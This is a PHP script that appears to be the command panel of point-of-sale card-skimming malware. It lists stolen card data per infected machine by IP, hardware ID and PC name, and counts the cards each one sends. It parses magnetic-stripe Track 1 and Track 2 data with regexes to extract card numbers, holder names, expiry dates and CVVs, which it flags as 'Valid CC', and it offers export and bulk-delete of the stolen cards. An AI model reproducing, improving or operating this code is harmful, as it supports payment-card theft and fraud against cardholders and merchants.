<?php
if (!defined('AUTHED') || !AUTHED)
	die('no direct xs');
	
if (isset($_POST['clear'])) {
	if (!mysql_query("TRUNCATE TABLE cards"))
		mysql_query("DELETE FROM cards");
}

print '<script>function affirm() {return confirm("are you SURE you want to DELETE ALL CARDS?");}</script>' .
	'<form action="" method="POST"><input type="submit" name="clear" value="Clear Cards" onclick="return affirm()" />' .
	'<a href="export.php" target="_blank">Export Cards</a>&nbsp;&nbsp;&nbsp;<a href="export.php?clean" target="_blank">Export filtered</a></form>';

function verify($track)
{
	$track1 = "((%?[Bb]?)[0-9]{13,19}\\^([A-Za-z\\s]{0,26})\\/([A-Za-z\\s]{0,26})\\^(1[2-9])(0[1-9]|1[0-2])([0-9\\s]{3,50}\\?))";
	$track2 = "(([0-9]{13,19})=(1[2-9])(0[1-9]|1[0-2])[0-9]{3,50}\\?)";
	$cvv2 = "(([0-9\\s]{0,44})([0-9]{3})000000\\?)";
	
	$matches1 = array();
	$matches2 = array();
	$cvv = array();
	
	preg_match($track1, $track, $matches1);
	preg_match($track2, $track, $matches2);
	
	if (count($matches1) && count($matches2)) {
	
		if (@$matches2[2] === @$matches1[4] &&
		  @$matches2[3] === @$matches1[5]) {
			if (preg_match($cvv2, @$matches1[6], $cvv)) {
				$pan = urlencode($matches2[1]);
				$valid = urlencode(@$matches2[2] . '/' . @$matches2[3]);
				$pn = urlencode(@$matches1[3]);
				$sn = urlencode(@$matches1[2]);
				$cvv = @$cvv[2];
				return "<a href=\"?do=cc&pn=$pn&sn=$sn&pan=$pan&cvv=$cvv&val=$valid\" target=\"_blank\">Valid CC</a>";
			} else
				return "Might be cc";
		} else
			return "No valid Tracks";
	}
	else if (count($matches1))
			return "Might be Track1";
	else if (count($matches2))
		return "Might be Track2";
	else
		return "No valid Tracks";
}

$sql = "SELECT * FROM cards";
if (@$_GET['sort'] === 'IP')
	$sql .= " ORDER BY ip";
else if (@$_GET['sort'] === 'hwid')
	$sql .= " ORDER BY hwid";
else if (@$_GET['sort'] === 'pcn')
	$sql .= " ORDER BY pcn";

$table = '<table><tr><td><a href="?sort=ip">IP</a></td><td><a href="?sort=hwid">Hardware ID</a></td><td><a href="?sort=pcn">PC Name</a></td><td>date</td><td>data</td><td>Valid</td></tr>';
$stats = array();

$res = mysql_query($sql);
while ($row = mysql_fetch_assoc($res)) {
	$key = $row['hwid'];
	if (!isset($stats[$key])) {
		$link = '<a href="?show=logs&hwid=' . htmlentities($row['hwid']) . '">' . htmlentities($row['hwid']) . '</a>';
		$stats[$key] = array("$link@" . htmlentities($row['pcn']), 1);
	} else
		$stats[$key][1]++;
		
	$table .= "<tr><td>$row[ip]</td><td>" . htmlentities($row['hwid']) . "</td><td>" . htmlentities($row['pcn']) . "</td><td>" . date('d F Y H:i:s', $row['date']) . "</td><td>" .
		htmlentities($row['card'], ENT_QUOTES | ENT_IGNORE) . '</td><td>' . verify($row['card']) . '</td></tr>';
}
$table .= '</table>';

print '<h2>Card stats</h2>';
foreach ($stats as $s)
	print "$s[0] sent $s[1] cards<br />";
	
print "<br /><h2>Cards</h2>$table";
?>
